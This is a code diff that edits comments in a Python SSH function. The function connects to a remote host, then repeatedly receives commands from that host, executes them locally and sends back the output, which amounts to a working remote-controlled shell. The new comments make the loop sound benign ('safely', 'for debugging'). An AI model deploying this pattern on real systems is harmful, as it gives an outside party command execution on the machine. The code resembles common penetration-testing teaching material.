@@ -15,26 +15,28 @@ def ssh_command(ip, port, user, passwd, command):
     # Open a transport session for interactive command exchange.
     ssh_session = client.get_transport().open_session()
     if ssh_session.active:
-        # Notify the remote side that the client connected.
+        # Notify the remote side that the client connected and send a tag.
         ssh_session.send(command.encode())
-        # Print any welcome/initial message from remote.
+        # Print any welcome/initial message from remote (if sent).
         print(ssh_session.recv(1024).decode())
         while True:
-            # Receive a command from the remote side.
+            # Receive a command from the remote side (up to 1024 bytes).
             command = ssh_session.recv(1024)
             if not command:
                 break
             try:
                 cmd = command.decode().strip()
-                # 'exit' terminates the session.
+                # 'exit' terminates the session from the remote side.
                 if cmd == 'exit':
                     client.close()
                     break
                 # Run the received command locally and send back output.
+                # We avoid shell=True and split the command safely.
                 cmd_output = subprocess.check_output(shlex.split(cmd))
+                # Send raw command output bytes; send a small OK message if none.
                 ssh_session.send(cmd_output or b'okay')
             except Exception as e:
-                # Send exception text back to remote.
+                # Return the exception text to the remote for debugging.
                 ssh_session.send(str(e).encode())
         client.close()
     return
